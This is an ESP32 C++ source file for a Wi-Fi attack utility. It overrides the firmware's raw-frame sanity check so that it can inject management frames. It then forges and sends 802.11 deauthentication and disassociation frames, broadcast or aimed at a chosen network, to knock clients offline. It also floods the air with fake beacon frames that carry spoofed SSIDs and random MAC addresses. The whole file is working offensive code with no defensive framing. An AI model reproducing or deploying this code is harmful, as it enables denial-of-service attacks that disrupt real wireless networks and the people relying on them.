//
// Created by l-sha on 10/7/2025.
//

#include "os/utility/WifiAttackUtility.h"
#include <esp_wifi.h>

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  if (arg == 31337) return 1;
  else return 0;
}

WifiAttackUtility::WifiAttackUtility()
{
  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAP("No Internet", "12345678", 1, true);
}

WifiAttackUtility::~WifiAttackUtility()
{
  WiFi.softAPdisconnect(true);
  WiFi.disconnect(true, true);
  WiFi.mode(WIFI_OFF);
  sequence_number = 0;
}

esp_err_t WifiAttackUtility::change_channel(const uint8_t channel) noexcept
{
  return esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

esp_err_t WifiAttackUtility::send_packet(const uint8_t* packet, const size_t len) noexcept
{
  return esp_wifi_80211_tx(WIFI_IF_AP, packet, len, false);
}

esp_err_t WifiAttackUtility::deauthenticate(const MacAddr bssid, const uint8_t channel)
{
  const MacAddr AP = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
  return deauthenticate(AP, bssid, channel);
}

esp_err_t WifiAttackUtility::deauthenticate(const MacAddr ap, const MacAddr bssid, const uint8_t channel)
{
  esp_err_t res = change_channel(channel);
  if(res != ESP_OK) return res;

  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));

  memcpy(&deauth_frame[4], ap, 6);
  memcpy(&deauth_frame[10], bssid, 6);
  memcpy(&deauth_frame[16], bssid, 6);
  memcpy(&deauth_frame[22], &sequence_number, 2);

  sequence_number++;

  res = send_packet(deauth_frame, sizeof(deauth_frame));
  if(res == ESP_OK) return ESP_OK;
  deauth_frame[0] = 0xa0;
  return send_packet(deauth_frame, sizeof(deauth_frame));
}

esp_err_t WifiAttackUtility::beacon_spam(const std::string& ssid, const uint8_t channel)
{
  esp_err_t res = change_channel(channel);
  if(res != ESP_OK) return res;

  uint8_t tmpSSID[32] = {
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  };

  for (size_t i = 0; i < ssid.length() && i < 32; i++) {
    tmpSSID[i] = ssid[i];
  }

  // set MAC address
  uint8_t macAddr[6] = {};
  for (int i = 0; i < 6; i++) {
    macAddr[i] = random(0, 256);
  }

  memcpy(&beaconPacket[38], tmpSSID, 32);

  // write MAC address into beacon frame
  memcpy(&beaconPacket[10], macAddr, 6);
  memcpy(&beaconPacket[16], macAddr, 6);

  // set channel for beacon frame
  beaconPacket[82] = channel;
  beaconPacket[34] = 0x31; // wpa
  for (int k = 0; k < 3; k++) {
    send_packet(beaconPacket, sizeof(beaconPacket));
    vTaskDelay(1 / portTICK_RATE_MS);
  }

  return ESP_OK;
}